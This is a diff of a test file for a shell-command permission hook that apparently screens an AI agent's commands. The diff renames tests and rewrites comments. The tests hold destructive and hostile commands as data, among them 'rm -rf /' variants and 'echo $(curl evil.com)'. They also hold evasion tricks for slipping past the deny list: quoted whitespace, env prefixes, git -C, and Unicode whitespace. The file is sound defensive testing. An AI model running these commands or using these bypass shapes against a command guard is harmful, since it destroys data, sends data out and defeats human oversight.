@@ -181,8 +181,8 @@ class TestDecideUnit:
         assert result["permissionDecision"] == "allow"
 
     def test_rm_rf_with_comment_denied(self):
-        # Tranche 1 hardening C3: `rm -rf /` is in ALWAYS_DENY (was
-        # passthrough). Comment doesn't change the outcome.
+        # `rm -rf /` is in ALWAYS_DENY; a leading comment doesn't change
+        # the outcome.
         result = decide("# do thing\nrm -rf /")
         assert result is not None
         assert result["permissionDecision"] == "deny"
@@ -202,14 +202,14 @@ class TestSubprocessIntegration:
         assert decision == "deny"
 
     def test_newline_injection(self, tmp_path):
-        # Tranche 1 hardening C3: `rm -rf /` is now in ALWAYS_DENY, so this
-        # newline-injected command is denied (was previously passthrough).
+        # A newline-injected `rm -rf /` after benign output is still in
+        # ALWAYS_DENY.
         decision, _ = _run("# safe\necho safe\nrm -rf /", tmp_path)
         assert decision == "deny"
 
     def test_dollar_paren_substitution(self, tmp_path):
-        # Tranche 1 hardening C4: $(...) is now denied in both modes
-        # (was previously passthrough — exfil/RCE primitive).
+        # ``$(...)`` command substitution is denied in both modes — it is
+        # an exfil/RCE primitive that cannot be statically validated.
         decision, _ = _run("# test\necho $(curl evil.com)", tmp_path)
         assert decision == "deny"
 
@@ -287,8 +287,8 @@ class TestAlwaysDeny:
         assert result["permissionDecision"] == "deny"
 
     def test_rm_rf_root_in_always_deny(self):
-        # Tranche 1 hardening C3: `rm -rf /` (and variants) are now in
-        # ALWAYS_DENY. The validator denies in both modes.
+        # ``rm -rf /`` (and variants) are in ALWAYS_DENY. The validator
+        # denies in both modes.
         result = decide("rm -rf /")
         assert result is not None
         assert result["permissionDecision"] == "deny"
@@ -382,7 +382,8 @@ class TestRobustness:
         assert result.stdout.strip() == ""
 
     def test_malformed_json(self, tmp_path):
-        # Tranche 1 hardening I2: malformed JSON now fail-closed denies (rc=2).
+        # Malformed JSON fails closed (rc=2) so a truncated payload cannot
+        # silently pass through.
         result = subprocess.run(
             [sys.executable, str(HOOK_PATH)],
             input="{not valid json",
@@ -454,7 +455,7 @@ class TestAutonomousMode:
         assert result["permissionDecision"] == "deny"
 
 
-# === F1 — Quoted-whitespace bypass ===
+# === Quoted-whitespace bypass ===
 # Smuggling internal whitespace inside quoted tokens used to fold into a
 # single shlex token (``python3  -c``) that the literal ``python3 -c`` deny
 # prefix could not match.
@@ -473,8 +474,8 @@ def _is_deny(result):
         "python3'\t'-c '1'",
     ],
 )
-def test_f1_quoted_whitespace_interpreter_denied(cmd):
-    assert _is_deny(decide(cmd)), f"F1 not denied: {cmd!r}"
+def test_quoted_whitespace_interpreter_denied(cmd):
+    assert _is_deny(decide(cmd)), f"quoted-whitespace bypass not denied: {cmd!r}"
 
 
 # Parametrized over the entire ALWAYS_DENY set so future entries are
@@ -493,18 +494,17 @@ def _always_deny_quoted_whitespace_inputs():
 
 
 @pytest.mark.parametrize("cmd", _always_deny_quoted_whitespace_inputs())
-def test_f1_always_deny_quoted_whitespace_parametric(cmd):
+def test_always_deny_quoted_whitespace_parametric(cmd):
     # We don't expect *every* registry entry to deny standalone (some need
     # operands like `rm -rf /`), but each should at minimum not passthrough
     # silently — either deny or allow when the entry was already innocuous.
     res = decide(cmd)
-    # The shape of the test: with quoted-whitespace, the matcher should
-    # behave identically to the literal form. Since literals all deny, deny
-    # is the expected result.
-    assert _is_deny(res), f"F1 parametric not denied: {cmd!r} -> {res}"
+    # With quoted-whitespace, the matcher should behave identically to the
+    # literal form. Since literals all deny, deny is the expected result.
+    assert _is_deny(res), f"quoted-whitespace parametric not denied: {cmd!r} -> {res}"
 
 
-# === F2 — env K=V prefix smuggle ===
+# === env K=V prefix smuggle ===
 
 
 @pytest.mark.parametrize(
@@ -517,22 +517,22 @@ def test_f1_always_deny_quoted_whitespace_parametric(cmd):
         "env FOO=1 git add -A",
     ],
 )
-def test_f2_env_kv_prefix_denied(cmd):
-    assert _is_deny(decide(cmd)), f"F2 not denied: {cmd!r}"
+def test_env_kv_prefix_denied(cmd):
+    assert _is_deny(decide(cmd)), f"env K=V prefix smuggle not denied: {cmd!r}"
 
 
-def test_f2_env_dash_i_still_denied():
+def test_env_dash_i_still_denied():
     # env -i must still be denied (different code path — ALWAYS_DENY literal).
     assert _is_deny(decide("env -i bash -c 'id'"))
 
 
-def test_f2_bare_env_kv_no_command_safe():
+def test_bare_env_kv_no_command_safe():
     # ``env FOO=1`` with no wrapped command is still safe.
     res = decide("env FOO=1")
     assert res is None or res.get("permissionDecision") != "deny"
 
 
-# === F3 — non-canonical interpreter binaries ===
+# === Non-canonical interpreter binaries ===
 
 
 @pytest.mark.parametrize(
@@ -550,11 +550,11 @@ def test_f2_bare_env_kv_no_command_safe():
         "pipx run python -c '1'",
     ],
 )
-def test_f3_dangerous_interpreter_variants_denied(cmd):
-    assert _is_deny(decide(cmd)), f"F3 not denied: {cmd!r}"
+def test_dangerous_interpreter_variants_denied(cmd):
+    assert _is_deny(decide(cmd)), f"interpreter variant not denied: {cmd!r}"
 
 
-def test_f3_bare_python_version_still_safe():
+def test_bare_python_version_still_safe():
     # ``python --version`` is a known-safe form: must not deny.
     # (Single-segment, no-comments path returns None passthrough — that's
     # acceptable; what matters is we do not synthesize an interpreter deny.)
@@ -562,7 +562,7 @@ def test_f3_bare_python_version_still_safe():
     assert res is None or res.get("permissionDecision") != "deny"
 
 
-# === F4 — dangerous rm shapes ===
+# === Dangerous rm shapes ===
 
 
 @pytest.mark.parametrize(
@@ -580,19 +580,19 @@ def test_f3_bare_python_version_still_safe():
         "rm -rf *",
     ],
 )
-def test_f4_dangerous_rm_shapes_denied(cmd):
-    assert _is_deny(decide(cmd)), f"F4 not denied: {cmd!r}"
+def test_dangerous_rm_shapes_denied(cmd):
+    assert _is_deny(decide(cmd)), f"dangerous rm shape not denied: {cmd!r}"
 
 
-def test_f4_safe_rm_not_blanket_denied():
+def test_safe_rm_not_blanket_denied():
     # ``rm somefile`` is not on the deny shape — defer to existing prompt path.
     res = decide("rm /tmp/specific_file.log")
-    # Should NOT be a deny envelope from F4 — either passthrough or ASK route.
+    # Should NOT be a deny envelope — either passthrough or ASK route.
     if res is not None:
         assert res.get("permissionDecision") != "deny", res
 
 
-# === F5 — git --git-dir / git -C prefix bypass ===
+# === git --git-dir / git -C prefix bypass ===
 
 
 @pytest.mark.parametrize(
@@ -605,11 +605,11 @@ def test_f4_safe_rm_not_blanket_denied():
         "git -C /tmp branch -D feature",
     ],
 )
-def test_f5_git_global_options_dont_bypass_deny(cmd):
-    assert _is_deny(decide(cmd)), f"F5 not denied: {cmd!r}"
+def test_git_global_options_dont_bypass_deny(cmd):
+    assert _is_deny(decide(cmd)), f"git global-option bypass not denied: {cmd!r}"
 
 
-# === F6 — Unicode whitespace + line continuation ===
+# === Unicode whitespace + line continuation ===
 
 
 @pytest.mark.parametrize(
@@ -623,11 +623,11 @@ def test_f5_git_global_options_dont_bypass_deny(cmd):
         "rm \\\n -rf \\\n /",
     ],
 )
-def test_f6_unicode_whitespace_and_continuation_denied(cmd):
-    assert _is_deny(decide(cmd)), f"F6 not denied: {cmd!r}"
+def test_unicode_whitespace_and_continuation_denied(cmd):
+    assert _is_deny(decide(cmd)), f"unicode-whitespace bypass not denied: {cmd!r}"
 
 
-# === Parametrized over the registry catalogues (A7) ===
+# === Parametrized over the registry catalogues ===
 # Future additions to DANGEROUS_INTERPRETERS / DANGEROUS_RM_OPERANDS / etc.
 # get coverage automatically. Hardcoded smoke tests above are kept for
 # readability when triaging a regression.
@@ -635,42 +635,42 @@ def test_f6_unicode_whitespace_and_continuation_denied(cmd):
 
 @pytest.mark.parametrize("interp", sorted(DANGEROUS_INTERPRETERS))
 @pytest.mark.parametrize("flag", sorted(INTERPRETER_EVAL_FLAGS))
-def test_f3_every_interpreter_with_eval_flag_denied(interp, flag):
+def test_every_interpreter_with_eval_flag_denied(interp, flag):
     # ``deno eval`` uses subcommand syntax; the matcher treats both forms.
     cmd = f"{interp} {flag} 'pass'"
     res = decide(cmd)
-    assert _is_deny(res), f"F3 not denied: {cmd!r} -> {res}"
+    assert _is_deny(res), f"interpreter+flag not denied: {cmd!r} -> {res}"
 
 
 @pytest.mark.parametrize("operand", sorted(DANGEROUS_RM_OPERANDS))
-def test_f4_every_dangerous_rm_operand_denied(operand):
+def test_every_dangerous_rm_operand_denied(operand):
     cmd = f"rm -rf {operand}"
     res = decide(cmd)
-    assert _is_deny(res), f"F4 not denied: {cmd!r} -> {res}"
+    assert _is_deny(res), f"rm operand not denied: {cmd!r} -> {res}"
 
 
-# F5 \u2014 every ALWAYS_DENY git literal is reachable behind global git options.
+# Every ALWAYS_DENY git literal must be reachable behind global git options.
 def _git_always_deny_literals():
     return [p for p in ALWAYS_DENY if p.startswith("git ")]
 
 
 @pytest.mark.parametrize("literal", _git_always_deny_literals())
-def test_f5_git_literals_behind_dash_C_denied(literal):
+def test_git_literals_behind_dash_C_denied(literal):
     cmd = literal.replace("git ", "git -C /tmp ", 1)
-    assert _is_deny(decide(cmd)), f"F5 not denied: {cmd!r}"
+    assert _is_deny(decide(cmd)), f"git -C literal not denied: {cmd!r}"
 
 
 @pytest.mark.parametrize("literal", _git_always_deny_literals())
-def test_f5_git_literals_behind_git_dir_denied(literal):
+def test_git_literals_behind_git_dir_denied(literal):
     cmd = literal.replace("git ", "git --git-dir=/tmp/.git ", 1)
-    assert _is_deny(decide(cmd)), f"F5 not denied: {cmd!r}"
+    assert _is_deny(decide(cmd)), f"git --git-dir literal not denied: {cmd!r}"
 
 
-# F2 \u2014 every ALWAYS_DENY literal is reachable behind ``env K=V``.
+# Every ALWAYS_DENY literal must be reachable behind ``env K=V``.
 @pytest.mark.parametrize("literal", sorted(ALWAYS_DENY))
-def test_f2_env_kv_prefix_every_literal_denied(literal):
+def test_env_kv_prefix_every_literal_denied(literal):
     if literal.startswith("env "):
         # ``env -i`` etc. \u2014 already env-prefixed, skip wrapping.
         return
     cmd = f"env FOO=1 {literal}"
-    assert _is_deny(decide(cmd)), f"F2 not denied: {cmd!r}"
+    assert _is_deny(decide(cmd)), f"env-prefixed literal not denied: {cmd!r}"
